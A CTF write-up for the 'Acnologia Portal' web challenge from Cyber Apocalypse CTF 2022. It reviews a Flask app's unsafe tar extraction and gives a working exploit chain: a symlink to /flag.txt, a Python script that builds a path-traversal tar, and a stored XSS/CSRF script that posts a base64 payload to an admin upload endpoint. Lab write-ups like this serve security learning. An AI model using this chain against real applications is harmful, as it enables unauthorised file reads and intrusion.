---
title: Acnologia Portal - Cyber Apocalypse CTF 2022
date: 2022-05-21 00:00:00 +0800
categories: [CTF, writeup]
tags: [web]     # TAG names should always be lowercase
toc: true
image:
  src: /assets/img/posts/cactf/CA_CTF_2022_Banner_01_Quote.png
  width: 500   # in pixels
  height: 200   # in pixels
  alt: ca banner
---

# Acnologia Portal
## Difficulty: medium
## Catigory: web



This is an unintended way and how i solve it during the CTF.

## Discovering
Looking at the website page there is a normal login and signup.

After create account found a button to submit a bug.

First guess is XSS to steal admin cookie when reviewing the reported bug but id didn't work cookies are http only.


![challange-description](/assets/img/posts/cactf/rebort_bug.png)
_report bug form_

## Code Review
Looking at the code found an interesting function `extract_firmware`.

It is used to upload and extract tar file on a random generated file at the server static file.

The function save the file using the given `filename` after joined to `tmp` without proper checking.

You can menapulate `filname` or name of files inside tar.

```python
def extract_firmware(file):
    tmp  = tempfile.gettempdir()
    path = os.path.join(tmp, file.filename)
    file.save(path)

    if tarfile.is_tarfile(path):
        tar = tarfile.open(path, 'r:gz')
        tar.extractall(tmp)

        rand_dir = generate(15)
        extractdir = f"{current_app.config['UPLOAD_FOLDER']}/{rand_dir}"
        os.makedirs(extractdir, exist_ok=True)
        for tarinfo in tar:
            name = tarinfo.name
            if tarinfo.isreg():
                try:
                    filename = f'{extractdir}/{name}'
                    os.rename(os.path.join(tmp, name), filename)
                    continue
                except:
                    pass
            os.makedirs(f'{extractdir}/{name}', exist_ok=True)
        tar.close()
        return True

    return False
```
{: file="util.py" }

And this function only called from this route `/firmware/upload` that require admin previliges.

```python
@api.route('/firmware/upload', methods=['POST'])
@login_required
@is_admin
def firmware_update():
    if 'file' not in request.files:
        return response('Missing required parameters!'), 401

    extraction = extract_firmware(request.files['file'])
    if extraction:
        return response('Firmware update initialized successfully.')

    return response('Something went wrong, please try again!'), 403
```
{: filename="routes.py"}

## Attacking

- Created a `symlink` file point to a flag.txt at the '/'

```shell
ln -s /flag.txt flagln.txt
```
{: .nolineno }


- Create a custom tar file using `arcname` parameter to specify the name we want.

```python
import tarfile
tar = tarfile.open("payload.tar.gz", "w:gz")
tar.add(name="flagln.txt", arcname="../app/application/static/flagln.txt")
tar.close()
```
- Convert `payload.tar.gz` to base64
- Send CSRF payload

```html
<script>
payload = atob('H4sICPrDi2IC/3BheWxvYWQudGFyAO3UzYrCMBSG4ay9il5B/pp6dCG4dDm3ELQ6hVZFI/TyTWdgdCO6cEYY3wfCCSeBnM0XbbSZf8R+UcdVfVC/wn67Va0tw2U/9J31zquiV3/gdEzxkJ9X78lPii41XT1z46osfTUJoqfiKpHxSOHf09rE/X5YbbOMqdltTQ5EapZm3cZNu9WpT8/Iv4gM1Ullr+tP5l3wwUvIf0Hu5/Tn64X/muEZEzyQ/y5+drvT6ua9e+cAAAAAAAAAAAAAAADAC5wBT7HVYAAoAAA=')

u8arr = new Uint8Array(payload.length)

for(let i = 0; i < payload.length; i++) {
    u8arr[i] = payload.charCodeAt(i)
}

tar = new File([u8arr], 'payload.tar.gz', {type:"application/gzip"})

var formData = new FormData()

formData.append('file', tar)

var request = new XMLHttpRequest()
request.open("POST", "/api/firmware/upload")
request.send(formData)

</script>
```
{: file="CSRF" }

- Open `static/flagln.txt` and it reads the flag
![challange-description](/assets/img/posts/cactf/flag.png)
_flag_



